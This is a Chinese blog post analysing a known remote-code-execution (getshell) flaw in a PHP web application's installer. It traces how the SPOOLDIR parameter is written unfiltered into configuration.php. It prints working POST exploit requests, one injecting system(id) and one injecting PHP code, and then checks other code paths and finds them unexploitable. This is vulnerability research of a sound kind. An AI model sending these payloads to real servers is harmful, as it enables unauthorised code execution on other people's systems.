> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/O9Dh2iW6sky-RZF49K2Azg)

背景
==

看到这个漏洞的 EXP，没咋看到分析，漏洞原理很简单，下了份源码看看能不能混个 CVE，结果啥也没捞到，写个过程记录下。

分析
==

已知 EXP，找触发点就行

```
POST /index.php
HTTP/1.1
Host:
User-Agent: Mozilla/5.0
(Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0
Accept-Encoding: gzip,
deflateAccept: */*
Connection:
closeAccept-Language: en-US,en;q=0.5
Content-Type:
application/x-www-form-urlencoded; charset=UTF-8
Content-Length: 49
 
SPOOLDIR=test%22.system%28id%29.%22&recheck=recheck
```

看 index.php 49-56 行

![](https://mmbiz.qpic.cn/mmbiz_png/Lu7eicMrZheEUmdZcPZGBoSqicHgm8gXm2tNVFsYoQjpXrUqp9IKsVNNhfpUOy7iaeGuL9dOfTob9H8eVQ1InhIqA/640?wx_fmt=png)

先判断 configuration.php 这个文件是否存在，然后判断 recheck 和 SPOOLDIR 是否设置，在 if 中调用了 check_spooldir()，然后调用 setConfigurationTypeValue__index 函数，最后包含 configuration.php，跟进 check_spooldir() 看看  

![](https://mmbiz.qpic.cn/mmbiz_png/Lu7eicMrZheEUmdZcPZGBoSqicHgm8gXm2J8eTHm7moDqGtDFhOTXeN7xhqkY729w3HVA98ueFN4xaCiclDAVk8Hg/640?wx_fmt=png)

看 1209 行，如果 SPOOLDIR 有内容则进入 if 判断了 DISABLE_CHECK_SPOOLDIR 是否为空，然后创建了一个文件又删除了这个文件，返回真。不知道这里的用意是啥，不过这个不影响 getshell。

然后我们跟进 setConfigurationTypeValue__index 看看

![](https://mmbiz.qpic.cn/mmbiz_png/Lu7eicMrZheEUmdZcPZGBoSqicHgm8gXm2uoQZWdJKibFIyqhdYvm7S2n1zgYPKVIapm5ib23eKliaxjYtSq7iaoebSA/640?wx_fmt=png)

前面都不是啥重点，我们可以看到 $value 经过 escapeConfigurationValue__index 和一堆赋值后变成 $contentNewE 写入了 configuration.php。我们看下 escapeConfigurationValue__index 这个过滤函数干啥了。  

![](https://mmbiz.qpic.cn/mmbiz_png/Lu7eicMrZheEUmdZcPZGBoSqicHgm8gXm2CVCGzI2WIr639NMlFbicibBib1rpNOmmPf8meEDx6h0bHjm0tcibrWfD3w/640?wx_fmt=png)

先判断是不是字符串，然后转义单引号和反斜杠，并没有过滤尖括号以及双引号之类的。对 getshell 好像没有啥限制。所以我们在第一次系统安装时 getshell 的 exp 就是：  

```
POST /index.php HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0
Accept-Encoding: gzip, deflateAccept: */*
Connection: closeAccept-Language: en-US,en;q=0.5
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Content-Length: 49

SPOOLDIR=<?php phpinfo();?>&recheck=annen&DISABLE_CHECK_SPOOLDIR=1
```

当然这是在 configuration.php 存在的情况下，默认安装好 configuration.php 是不存在的，我们继续往下看

![](https://mmbiz.qpic.cn/mmbiz_png/Lu7eicMrZheEUmdZcPZGBoSqicHgm8gXm24x8Ws4yg7SXBicLtg2icbOskqtvia45muhibmtUHnTBuXdrSBJiat3mLYVQ/640?wx_fmt=png)

跟进 write_config()

![](https://mmbiz.qpic.cn/mmbiz_png/Lu7eicMrZheEUmdZcPZGBoSqicHgm8gXm2O0hDoEQicicF7u3YTr0rbNfkH7Bg3r9UJtgfLVaSgYhwhUVNpkpgFeDA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Lu7eicMrZheEUmdZcPZGBoSqicHgm8gXm20DgGiamJzWQeBUfAv8sEsQPnCPtP9AkQD4bmu7Lgz7iaB37DZ42d97mg/640?wx_fmt=png)

从业务上来看这是在配置数据库文件，exp 利用的就是这个位置，所有的 POST 请求都是通过 escapeConfigurationValue__index 过滤，我们之前分析了这个函数，对 getshell 影响并不大。然后在 961 行到 970 行这一段直接把上面的内容写入 configuration.php。造成 getshell。所以这里能 getshell 的变量还是很多。

拓展
==

其实这个 CVE 很简单，我寻思还有没有其他的点呢，于是看了下其他文件

看到 php/lib/functions_open.php 中有个 exec，以为能命令注入呢，看到 hwid 和 licensetoken 先被 urlencode 编码然后又被 escapeshellarg 过滤。外面还包裹了单引号，查询了相关资料发现无解。这个点无法利用。

![](https://mmbiz.qpic.cn/mmbiz_png/Lu7eicMrZheEUmdZcPZGBoSqicHgm8gXm2o4VFh6MXU6qKl9AkOqoNmWfia8vIqFKJYU1hhZpkKCqTa0NNCpX7GxQ/640?wx_fmt=png)

不死心继续看 index.php，看到这么一段

![](https://mmbiz.qpic.cn/mmbiz_png/Lu7eicMrZheEUmdZcPZGBoSqicHgm8gXm2ia1FeFCG8Y6fVSSYGbfk6om9NlegquKzCGqOHjd5ic67cUOqXce8gpAQ/640?wx_fmt=png)如果能进入 else if 就能写 shell, 但是前面还有个拦路虎。跟进看看 check_key_content-before_save。看看有没有戏  

![](https://mmbiz.qpic.cn/mmbiz_png/Lu7eicMrZheEUmdZcPZGBoSqicHgm8gXm2TasWtQYsOHXBOSocNwicrfJtvDcpN1qZdpDDvgJVStYksZbycoMzibiaQ/640?wx_fmt=png)

看正则❤凉了半截，过程很简单，如果符合匹配到正则内容就返回真，为真我们就能写文件，但这个正则已经把文件内容限制死了，要不然就无法通过

根据正则要求的文件内容如下，感觉无解。

```
<?php exit(0); ?>

Expires: 06 Jun 2021
easycallerid: 1
id: 71286
upgradeexpirxxxxxxxxxeq: 2021-06-06

------ LICENSE FILE DATA -------
3172UU1Y0X6Kq1CfY7to1xnB0VNJJ2QF
cG6YincUBpF9jLzJBGdMG2FSyM5orlzy
hG276foZvkZkpLMzJzhbMAnQiw61GUvv
Lpmitn3Z/6tntOMKdvhDlyapiz6sKuaa
Af8K+u6UOHZCea6H4xuvs3qzx35qf6Df
yMoN+BlwG35y/mtOOlokw/EATtVe4gwo
mstCsZKNHIe8TXaoogj/iePQ63HC8Qosx
v2fPCsuAUoKEvXsLryC5bm7XYi+MTp1g
gxs6OQAZDx9ZoKOo4Oyc3CARmiOy73TW6
iOLB3RpVMcARZtPLbJWZVyh+jeO81YjN
S3pZyobLz6EM2qRRBTLymQymSoXW3T2y
PZm2c22j2NRZCHNOYNgbeujZfRnCt/Bn
fBa2gZz3Yq5ORGC=
--------------------------------
```

以上就是符合要求的正则，感觉无利用姿势了，如果有师傅有其他姿势带带弟弟